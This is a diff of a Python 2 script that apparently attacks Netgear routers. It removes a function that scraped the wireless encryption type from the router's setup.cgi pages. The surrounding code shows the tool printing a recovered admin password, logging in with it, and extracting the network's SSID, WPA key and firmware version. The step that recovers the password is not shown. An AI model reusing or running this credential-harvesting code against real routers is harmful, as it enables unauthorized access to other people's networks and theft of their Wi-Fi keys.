@@ -32,16 +32,6 @@ class Router(object):
 		except:
 		   return False
 
-	def get_enc(self):
-		url = '/setup.cgi?next_file=adv_wps.htm&todo=cfg_init'
-		data = self.request(url)
-		soup = bs(data)
-		table = soup.find('table')
-		rows = table.findAll('tr')[16]
-		cols = rows.findAll('td')[1]
-		return cols.text.split(' ')[0]
-
-
 	def get_wpa(self):
 		url = '/setup.cgi?next_file=adv_wire_wpa.htm&ssid_num=1&flag=1'
 		data = self.request(url)
@@ -87,7 +77,6 @@ def main():
 	print '[+] Admin Password: %s' %(pwd)
 	netgear = Router('admin',pwd,ipa)
 	print '[+] WLAN SSID: %s' % (netgear.get_ssid())
-	print '[+] WLAN Enc: %s' %(netgear.get_enc())
 	print '[+] WLAN WPA Key: %s' % (netgear.get_wpa())
 	print '[+] Firmware Version: %s' % (netgear.firmware_version())
 
